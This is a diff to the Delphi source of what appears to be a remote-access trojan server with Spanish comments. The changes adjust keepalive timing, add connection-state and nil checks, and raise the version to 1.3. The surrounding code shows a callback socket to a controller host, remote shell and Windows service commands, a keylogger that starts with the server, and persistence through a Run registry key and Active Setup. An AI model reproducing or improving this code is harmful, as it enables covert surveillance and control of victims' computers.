@@ -57,6 +57,7 @@ var
   lastCommandTime     : integer;
   MCompartida         : THandle;
   Indice              : string;
+  Conectando          : Boolean;
 const
   WM_ACTIVATE = $0006;
   ENTER = #10;
@@ -68,15 +69,18 @@ const
 
   procedure CheckAlive();
   begin
-    if not sock.connected then
+    if (sock = nil) then
+      exit;
+
+    if (not sock.connected) or Conectando then
     begin
       //No estaba conectado asi que me salgo
       Exit;
     end;
 
-    if ((getTickCount() - lastCommandTime) < 20000) then
+    if ((getTickCount() - lastCommandTime) < 40000) then
       Exit;
-    //No ha pasado 20 seg idle asi que no mando ping: (getTickCount - lastCommandTime)
+    //No ha pasado 40 seg idle asi que no mando ping: (getTickCount - lastCommandTime)
 
     if not busy then
     begin
@@ -117,7 +121,7 @@ const
     Msg: TMsg;
   begin
 //    ShowMessage('Soy el keepalive thread!!');
-    KeepAliveTimer(10000);
+    KeepAliveTimer(25000);
     while (GetMessage(Msg, 0, 0, 0)) do
     begin
       TranslateMessage(Msg);
@@ -179,7 +183,9 @@ const
         Delete(indice, 1, Pos('¬', indice));
 
         Pararcapturathread := true;
+        Conectando := true;
         sock.Connect(host, port);
+        Conectando := false;
         lastCommandTime := getTickCount;
         while sock.Connected do
         begin
@@ -197,7 +203,7 @@ const
 
           if Recibido = 'PONG' then
           begin
-            pongReceived := True;
+              pongReceived := True;
           end;
 
   {Información mostrada en el ListView de conexiones del cliente, se recibe tambien
@@ -312,6 +318,7 @@ const
             //Sintaxis: WINDPROC|Handle //Envìa el PID del proceso padre de la ventana con Handle
           begin
             Delete(Recibido, 1, 8);
+            TempCardinal := 0;
             GetWindowThreadProcessID(StrToInt(Recibido), TempCardinal);
             //WINDPROC|HandleDeLaVentana|ProcessID
             SendText('WINPROC|' + Recibido + '|' + IntToStr(TempCardinal) + ENTER);
@@ -969,8 +976,12 @@ const
           end; //if Pos('Shell', recibido) = 1
 
           if Recibido = 'LISTARSERVICIOS' then
-            SendText('SERVICIOSWIN' + '|' + ServiceList + ENTER);
-
+          begin
+            Tempstr := '';
+            Tempstr := ServiceList;
+            SendText('SERVICIOSWIN' + '|' + TempStr + ENTER);
+          end;
+          
           if Pos('INICIARSERVICIO', Recibido) = 1 then
           begin
             Delete(Recibido, 1, 15);
@@ -1115,6 +1126,7 @@ const
           if sock.Connected then
             sock.Disconnect;
           sock.Free;
+          sock := nil;
           Exit;
         end;//if sock <> nil
       end//except
@@ -1124,7 +1136,7 @@ const
   procedure CargarServidor(P:Pointer);
   begin
     Configuracion := TSettings(P^); //Leemos la configuración que nos han mandado
-    VersionDelServer := '1.2';
+    VersionDelServer := '1.3';
     BeginThread(nil,0,Addr(KeepAliveThread),nil,0,id1);
     OnServerInitKeylogger(); //Función que inicia el keylogger en caso de que se haya iniciado antes desde el cliente o en el futuro si la configuración lo marca
   
@@ -1150,6 +1162,6 @@ begin
     Configuracion.sRunRegKeyName          := 'Coolserver';
     Configuracion.bArranqueActiveSetup    := False;
     Configuracion.sActiveSetupKeyName     := 'blah-blah-blah-blah';
-    CargarServidor(@configuracion);}
-    //Fin de Para debug
+    CargarServidor(@configuracion);  
+    }//Fin de Para debug
 end.
